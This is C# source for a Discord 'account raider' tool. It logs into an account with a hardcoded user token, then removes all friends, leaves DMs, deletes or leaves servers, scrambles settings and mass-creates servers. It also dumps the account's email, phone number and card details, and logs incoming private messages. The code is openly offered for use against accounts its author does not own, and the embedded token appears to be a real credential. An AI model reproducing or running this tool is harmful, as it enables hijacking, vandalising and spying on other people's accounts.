using System;
using Discord.Gateway;
using Discord;
using System.Threading;
using System.Net;
using System.Drawing;
using System.ComponentModel;
using System.Net.Http;
using System.Net.Http.Headers;
using Newtonsoft.Json;
using System.IO;
using System.Runtime.InteropServices;
using System.Collections.Generic;
namespace Discord_Account_Raider_v1._0
{
    class Program
    {
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBox(IntPtr h, string m, string c, int type);
        private static void MSG_LOGGER(DiscordSocketClient client, MessageEventArgs args)
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            string from;
            DiscordChannel channel = client.GetChannel(args.Message.Channel.Id);
            if (channel.InGuild)
            {
                var server = client.GetGuild(args.Message.Guild.Id);
                from = $"#{channel.Name} - {server.Name}";
                Console.WriteLine($"\n[MESSAGE]: {args.Message.Content}\n[AUTHOR]: {args.Message.Author}\n[SERVER / CHANNEL]: {from}");
            }
            else
            {
                var privChannel = (PrivateChannel)channel;
                from = privChannel.Name ?? privChannel.Recipients[0].ToString();
                Console.WriteLine($"\n[MESSAGE]: {args.Message.Content}\n[AUTHOR]: {from}");
            }
        }
        static void Main(string[] args)
        {
            MessageBox((IntPtr)0, $"Hi there! Thanks for using visionary, if you would like to see / support my other programs head over to my github (link below) and check them out, and also major major shout out to iLinked for his amazing and fast api wrapper, without him this would not be possible, thank you!\n\n[Github]: https://github.com/Aquaries-999 \n[Discord]: https://discord.gg/NdTC3wv7r8", "Visionary Raider", 0);
            login:
            string title = "██╗░░░██╗██╗░██████╗██╗░█████╗░███╗░░██╗░█████╗░██████╗░██╗░░░██╗\n██║░░░██║██║██╔════╝██║██╔══██╗████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝\n╚██╗░██╔╝██║╚█████╗░██║██║░░██║██╔██╗██║███████║██████╔╝░╚████╔╝░\n░╚████╔╝░██║░╚═══██╗██║██║░░██║██║╚████║██╔══██║██╔══██╗░░╚██╔╝░░\n░░╚██╔╝░░██║██████╔╝██║╚█████╔╝██║░╚███║██║░░██║██║░░██║░░░██║░░░\n░░░╚═╝░░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░";
            DiscordSocketClient client = new DiscordSocketClient(null);
            Console.Title = "Visionary Raider | v1.0 | By Aquaries#0999 ";
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(title);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("-----------------------------------------------------------------");
            Console.WriteLine("[Version]: v1.0");
            Console.WriteLine("[Created by]: Aquaries#0999");
            Console.WriteLine($"[Username]: {Environment.UserName} / {Environment.MachineName}");
            Console.WriteLine("-----------------------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            try
            {
                client.Login("ODUzOTc1NTIyNTQzNzk2MjQ1.YQD3Eg.ThAzqAOEeScuE2pjIcaI7wikRNE");
            }
            catch (InvalidTokenException e)
            {
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[Error]: {e.Message}\n[Token]: {e.Token}");
                Thread.Sleep(3000);
                Console.Clear();
                goto login;
            }
            client.OnLoggedIn += LOGGED_IN;
            Thread.Sleep(-1);
        }
        private static void LOGGED_IN(DiscordSocketClient client, LoginEventArgs args)
        {
            HOME:
            string title = "██╗░░░██╗██╗░██████╗██╗░█████╗░███╗░░██╗░█████╗░██████╗░██╗░░░██╗\n██║░░░██║██║██╔════╝██║██╔══██╗████╗░██║██╔══██╗██╔══██╗╚██╗░██╔╝\n╚██╗░██╔╝██║╚█████╗░██║██║░░██║██╔██╗██║███████║██████╔╝░╚████╔╝░\n░╚████╔╝░██║░╚═══██╗██║██║░░██║██║╚████║██╔══██║██╔══██╗░░╚██╔╝░░\n░░╚██╔╝░░██║██████╔╝██║╚█████╔╝██║░╚███║██║░░██║██║░░██║░░░██║░░░\n░░░╚═╝░░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░";
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(title);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("-----------------------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine($"[SYSTEM]: Logged In As {client.User.Username}" + "#" + client.User.Discriminator);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("-----------------------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine("\n[1]: Start Raid");
            Console.WriteLine("[2]: Account Information");
            Console.WriteLine("[3]: Message Logger");
            Console.WriteLine("[4]: Discord Configuration / Information");
            Console.WriteLine("[5]: Exit");
            Console.Write("\n> Enter Option: ");
            var option = Console.ReadLine();
            if (option == "1")
            {
                WebClient wb = new WebClient();
                wb.DownloadFile("https://cdn.discordapp.com/attachments/831241117663232070/845548165687934986/image0.png", "PROFILE_UPDATE.png");
                for (int i = 0; i < 6; i++)
                {
                    client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                    client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Dark });
                }
                client.User.ChangeSettings(new UserSettingsProperties() { Theme = DiscordTheme.Light });
                try
                {
                    client.User.ChangeSettings(new UserSettingsProperties() { DeveloperMode = false });
                    client.User.ChangeSettings(new UserSettingsProperties() { PlayAnimatedEmojis = false });
                    client.User.ChangeSettings(new UserSettingsProperties() { Language = DiscordLanguage.Bulgarian });
                    client.User.ChangeSettings(new UserSettingsProperties() { CompactMessages = true });
                    client.User.ChangeSettings(new UserSettingsProperties() { ExplicitContentFilter = ExplicitContentFilter.DoNotScan });
                }
                catch
                {

                }
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine(title);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("-----------------------------------------------------------------");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("\n[+]: Removing All Friends...");
                Thread.Sleep(2000);
                Console.Clear();
                foreach (var friends in args.Relationships)
                {
                    friends.RemoveAsync();
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.WriteLine($"\n[!]: Removed Relationship With {friends.User.Username}");
                }
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine(title);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("-----------------------------------------------------------------");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("\n[+]: Closing DMS...");
                Thread.Sleep(2000);
                Console.Clear();
                foreach (var dm in args.PrivateChannels)
                {
                    if (dm.Type == ChannelType.DM)
                    {
                        try
                        {
                            dm.Leave();
                        }
                        catch
                        {
                            return;
                        }
                    }
                    else
                    {
                        try
                        {
                            dm.Leave();
                        }
                        catch
                        {
                            return;
                        }
                    }
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.WriteLine($"\n[!]: Closed DM With {dm.Name}");
                }
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine(title);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("-----------------------------------------------------------------");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("\n[+]: Removing Guilds...");
                Thread.Sleep(2000);
                Console.Clear();
                foreach (var guild in client.GetGuilds())
                {
                    if (guild.Owner)
                    {
                        try
                        {
                            guild.DeleteAsync();
                            Console.WriteLine($"\n[!]: Deleted Guild {guild.Name}");
                        }
                        catch { return; }
                    }
                    else
                    {
                        try
                        {
                            guild.LeaveAsync();
                            Console.WriteLine($"\n[!]: Left Guild {guild.Name}");
                        }
                        catch { return; }
                    }
                    Console.ForegroundColor = ConsoleColor.Magenta;
                }
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine(title);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("-----------------------------------------------------------------");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("\n[+]: Creating Guilds...");
                Thread.Sleep(2000); 
                Console.Clear();
                for (int i = 0; i < 100; i++)
                {
                    try
                    {
                        client.CreateGuildAsync($"{client.User.Username}", Image.FromFile("PROFILE_UPDATE.png"));
                    }
                    catch { return; }
                    File.Delete("PROFILE_UPDATE.png");
                }
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine($"[!]: Created 50 Guilds");
                complete:
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine(title);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("-----------------------------------------------------------------");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.Beep();
                Console.WriteLine("\n[+]: Raid is comeplete, would you like to return to the menu? [Y/N]");
                Console.Write("\n> Enter Option: ");
                var opn = Console.ReadLine();
                if (opn == "Y")
                {
                    goto HOME;
                }
                else if (opn == "N")
                {
                    goto complete;
                }
            }
            else if (option == "2")
            {
                INFOS:
                CardPaymentMethod cc = new CardPaymentMethod();
                ConnectedAccount connectedacc = new ConnectedAccount();
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine(title);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("-----------------------------------------------------------------");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("\n[+]: Username: " + client.User.Username);
                Console.WriteLine("[+]: Tag: " + "#" + client.User.Discriminator);
                Console.WriteLine("[+]: ID: " + client.User.Id);
                Console.WriteLine("[+]: Email: " + client.User.Email);
                Console.WriteLine("[+]: Email verified?: " + client.User.EmailVerified);
                Console.WriteLine("[+]: Phone Number: " + client.User.PhoneNumber);
                Console.WriteLine("[+]: Nitro: " + client.User.Nitro.ToString().Replace("Nitro", "10$ Nitro"));
                Console.WriteLine("[+]: Hypesquad: " + client.User.Hypesquad);
                Console.WriteLine("[+]: NSFW Allowed?: " + client.User.NsfwAllowed);
                Console.WriteLine("[+]: 2FA Enabled?: " + client.User.TwoFactorAuth);
                Console.WriteLine("[+]: Account Type: " + client.User.Type);
                Console.WriteLine("[+]: Avatar URL: " + client.User.Avatar.Url);
                Console.WriteLine("[+]: Creation Date: " + client.User.CreatedAt.Date);
                Console.WriteLine("[+]: Credit Card Last 4: " + cc.Last4);
                Console.WriteLine("[+]: Card Brand: " + cc.Brand);
                Console.WriteLine("[+]: Billing Address: " + cc.BillingAddress);
                Console.WriteLine("[+]: EXP Year: " + cc.ExpirationYear);
                Console.WriteLine("[+]: EXP Month: " + cc.ExpirationMonth);
                Console.WriteLine("[+]: Billing Info: " + cc.BillingAddress);
                Console.WriteLine("[+]: Connected Accounts: " + connectedacc.Name);
                Console.WriteLine("\n[!]: Do you wanna go back to the menu? [Y/N]");
                Console.Write("\n> Enter Option: ");
                var option2 = Console.ReadLine();
                if (option2 == "Y")
                {
                    Console.Clear();
                    goto HOME;
                }
                else
                {
                    Console.Clear();
                    goto INFOS;
                }
            }
            //Message logger
            else if (option == "3")
            {
                MessageBox((IntPtr)0, $"Hello {Environment.UserName}, once you open this logger, there will be no option to go back to the menu, in order to go back you need to restart the program.", "Visionary Raider", 0);
                Console.Clear();
                client.OnMessageReceived += MSG_LOGGER;
            }
            //Discord configuration
            else if (option == "4")
            {
                INFOS2:
                DiscordConfig cfg = new DiscordConfig();
                Console.Clear();
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine(title);
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("-----------------------------------------------------------------");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("\n[+]: API Version: " + cfg.ApiVersion);
                Console.WriteLine("[+]: Client Version: " + cfg.SuperProperties.ClientVersion);
                Console.WriteLine("[+]: Limit: " + cfg.RetryOnRateLimit);
                Console.WriteLine("[+]: Device: " + cfg.SuperProperties.Device);
                Console.WriteLine("[+]: Browser: " + cfg.SuperProperties.Browser);
                Console.WriteLine("[+]: OS: " + cfg.SuperProperties.OS);
                Console.WriteLine("\n[!]: Do you wanna go back to the menu? [Y/N]");
                Console.Write("\n> Enter Option: ");
                var option3 = Console.ReadLine();
                if (option3 == "Y")
                {
                    goto HOME;
                }
                else if (option == "N")
                {
                    Console.Clear();
                    goto INFOS2;
                }
            }
            //Shutdown / Log out
            else if (option == "5")
            {
                Console.Clear();
                Console.WriteLine("[!]: Shutting down...");
                Thread.Sleep(2000);
                Environment.Exit(0);
            }
        }
    }
}